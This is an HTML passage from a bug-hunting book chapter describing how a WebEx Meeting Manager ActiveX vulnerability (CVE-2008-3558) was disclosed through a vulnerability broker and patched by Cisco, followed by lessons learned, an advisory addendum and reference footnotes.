class="indexterm"/><a id="IDX-CHP-5-0024" class="indexterm"/><a id="IDX-CHP-5-0025" class="indexterm"/></p><p>As I mentioned before, I could have found the bug much faster if I had fuzzed the ActiveX control with COMRaider instead of reading the assembly. But hey, fuzzing is not as cool as reading assembly, right?</p></div>
<div class="sect1" title="5.3 Vulnerability Remediation"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_remediation-id3"/>5.3 Vulnerability Remediation</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Thursday, August 14, 2008</em></span></p></div><p>In <a class="xref" href="ch02.html" title="Chapter 2. Back to the ’90s">Chapter 2</a>, <a class="xref" href="ch03.html" title="Chapter 3. Escape from the WWW Zone">Chapter 3</a>, and <a class="xref" href="ch04.html" title="Chapter 4. NULL Pointer FTW">Chapter 4</a>, I disclosed the security bugs directly to the vendor of the compromised software and helped it to create a patch. I chose another disclosure process for this bug. This time I didn’t notify the vendor directly but rather sold the bug to a vulnerability broker (Verisign’s iDefense Lab Vulnerability Contributor Program [VCP]) and let it coordinate with Cisco (see Section 2.3).<a id="IDX-CHP-5-0026" class="indexterm"/></p><p>I contacted iDefense on April 8, 2008. It accepted my submission and informed Cisco of the issue. While Cisco was working on a new version of the ActiveX control, another security researcher named Elazar Broad rediscovered the bug in June 2008. He also informed Cisco but then disclosed the bug publicly in the process known as <span class="emphasis"><em>full disclosure</em></span>.<sup>[<a href="ch05s05.html#ftn.CHP-5-FN-10" class="footnoteref">54</a>]</sup> Cisco released a fixed version of WebEx Meeting Manager, as well as a security advisory, on August 14, 2008. All in all it was a great mess, but in the end Elazar and I made the Web a safer place.<a id="IDX-CHP-5-0027" class="indexterm"/></p></div>
<div class="sect1" title="5.4 Lessons Learned"><div class="titlepage"><div><div><h1 class="title"><a id="lessons_learned-id3"/>5.4 Lessons Learned</h1></div></div></div><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>There are still obvious, easily exploitable bugs in widely deployed (enterprise) software products.</p></li><li class="listitem"><p>Cross-site scripting breaks ActiveX domain restrictions. This is also true for Microsoft’s SiteLock.<sup>[<a href="ch05s05.html#ftn.CHP-5-FN-11" class="footnoteref">55</a>]</sup><a id="IDX-CHP-5-0028" class="indexterm"/></p></li><li class="listitem"><p>From a bug hunter’s perspective, ActiveX controls are promising and valuable targets.</p></li><li class="listitem"><p>Vulnerability rediscovery happens (way too often).<a id="IDX-CHP-5-0029" class="indexterm"/></p></li></ul></div></div>
<div class="sect1" title="5.5 Addendum"><div class="titlepage"><div><div><h1 class="title"><a id="addendum-id3"/>5.5 Addendum</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Wednesday, September 17, 2008</em></span></p></div><p>The vulnerability is fixed and a new version of WebEx Meeting Manager is available, so I released a detailed security advisory on my website today.<sup>[<a href="ch05s05.html#ftn.CHP-5-FN-12" class="footnoteref">56</a>]</sup> The bug was assigned CVE-2008-3558. <a class="xref" href="ch05s05.html#timeline_from_discovery_of_the_webex_mee" title="Figure 5-12. Timeline from discovery of the WebEx Meeting Manager vulnerability until the release of the security advisory">Figure 5-12</a> shows the timeline of the vulnerability fix.</p><div class="figure"><a id="timeline_from_discovery_of_the_webex_mee"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5994"/><img src="httpatomoreillycomsourcenostarchimages939303.png.jpg" alt="Timeline from discovery of the WebEx Meeting Manager vulnerability until the release of the security advisory"/></div></div><p class="title">Figure 5-12. Timeline from discovery of the WebEx Meeting Manager vulnerability until the release of the security advisory</p></div><div class="sect2" title="Notes"><div class="titlepage"><div><div><h2 class="title"><a id="notes-id4"/>Notes</h2></div></div></div><p><sup>[<a id="CHP-5-FN-1" href="#ftn.CHP-5-FN-1" class="footnote">45</a>]</sup></p><p><sup>[<a id="CHP-5-FN-2" href="#ftn.CHP-5-FN-2" class="footnote">46</a>]</sup></p><p><sup>[<a id="CHP-5-FN-3" href="#ftn.CHP-5-FN-3" class="footnote">47</a>]</sup></p><p><sup>[<a id="CHP-5-FN-4" href="#ftn.CHP-5-FN-4" class="footnote">48</a>]</sup></p><p><sup>[<a id="CHP-5-FN-5" href="#ftn.CHP-5-FN-5" class="footnote">49</a>]</sup></p><p><sup>[<a id="CHP-5-FN-6" href="#ftn.CHP-5-FN-6" class="footnote">50</a>]</sup></p><p><sup>[<a id="CHP-5-FN-7" href="#ftn.CHP-5-FN-7" class="footnote">51</a>]</sup></p><p><sup>[<a id="CHP-5-FN-8" href="#ftn.CHP-5-FN-8" class="footnote">52</a>]</sup></p><p><sup>[<a id="CHP-5-FN-9" href="#ftn.CHP-5-FN-9" class="footnote">53</a>]</sup></p><p><sup>[<a id="CHP-5-FN-10" href="#ftn.CHP-5-FN-10" class="footnote">54</a>]</sup></p><p><sup>[<a id="CHP-5-FN-11" href="#ftn.CHP-5-FN-11" class="footnote">55</a>]</sup></p><p><sup>[<a id="CHP-5-FN-12" href="#ftn.CHP-5-FN-12" class="footnote">56</a>]</sup><a id="IDX-CHP-5-0030" class="indexterm"/></p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-1" href="#CHP-5-FN-1" class="para">45</a>] </sup>COMRaider from iDefense is a great tool to enumerate and fuzz COM object interfaces. See <a class="ulink" href="http://labs.idefense.com/software/download/?downloadID=23">http://labs.idefense.com/software/download/?downloadID=23</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-2" href="#CHP-5-FN-2" class="para">46</a>] </sup>For more information, consult “Safe Initialization and Scripting for ActiveX Controls” at <a class="ulink" href="http://msdn.microsoft.com/en-us/library/aa751977(VS.85).aspx">http://msdn.microsoft.com/en-us/library/aa751977(VS.85).aspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-3" href="#CHP-5-FN-3" class="para">47</a>] </sup>See “Not safe = not dangerous? How to tell if ActiveX vulnerabilities are exploitable in Internet Explorer” at <a class="ulink" href="http://blogs.technet.com/srd/archive/2008/02/03/activex-controls.aspx">http://blogs.technet.com/srd/archive/2008/02/03/activex-controls.aspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-4" href="#CHP-5-FN-4" class="para">48</a>] </sup>For more information on cross-site scripting, refer to <a class="ulink" href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-5" href="#CHP-5-FN-5" class="para">49</a>] </sup>See “MindshaRE: Finding ActiveX Methods Dynamically” at <a class="ulink" href="http://dvlabs.tippingpoint.com/blog/2009/06/01/mindshare-finding-activex-methods-dynamically/">http://dvlabs.tippingpoint.com/blog/2009/06/01/mindshare-finding-activex-methods-dynamically/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-6" href="#CHP-5-FN-6" class="para">50</a>] </sup>See <a class="ulink" href="http://msdn.microsoft.com/en-us/library/9a16d4e4-a03d-459d-a2ec-3258499f6932(VS.85)">http://msdn.microsoft.com/en-us/library/9a16d4e4-a03d-459d-a2ec-3258499f6932(VS.85)</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-7" href="#CHP-5-FN-7" class="para">51</a>] </sup>WinDbg is the “official” Windows Debugger from Microsoft and is distributed as part of the free “Debugging Tools for Windows” suite, available at <a class="ulink" href="http://www.microsoft.com/whdc/DevTools/Debugging/default.mspx">http://www.microsoft.com/whdc/DevTools/Debugging/default.mspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-8" href="#CHP-5-FN-8" class="para">52</a>] </sup>See <a class="ulink" href="http://www.hex-rays.com/idapro/">http://www.hex-rays.com/idapro/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-9" href="#CHP-5-FN-9" class="para">53</a>] </sup>See <a class="ulink" href="http://www.trapkit.de/books/bhd/">http://www.trapkit.de/books/bhd/</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-10" href="#CHP-5-FN-10" class="para">54</a>] </sup>See <a class="ulink" href="http://seclists.org/fulldisclosure/2008/Aug/83">http://seclists.org/fulldisclosure/2008/Aug/83</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-11" href="#CHP-5-FN-11" class="para">55</a>] </sup>For more information on Microsoft’s SiteLock, see <a class="ulink" href="http://msdn.microsoft.com/en-us/library/bb250471%28VS.85%29.aspx">http://msdn.microsoft.com/en-us/library/bb250471%28VS.85%29.aspx</a>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-5-FN-12" href="#CHP-5-FN-12" class="para">56</a>] </sup>My security advisory that describes the details of the WebEx Meeting Manager vulnerability can be found at <a class="ulink" href="http://www.trapkit.de/advisories/TKADV2008-009.txt">http://www.trapkit.de/advisories/TKADV2008-009.txt</a>.</p></div></div></div></body></html>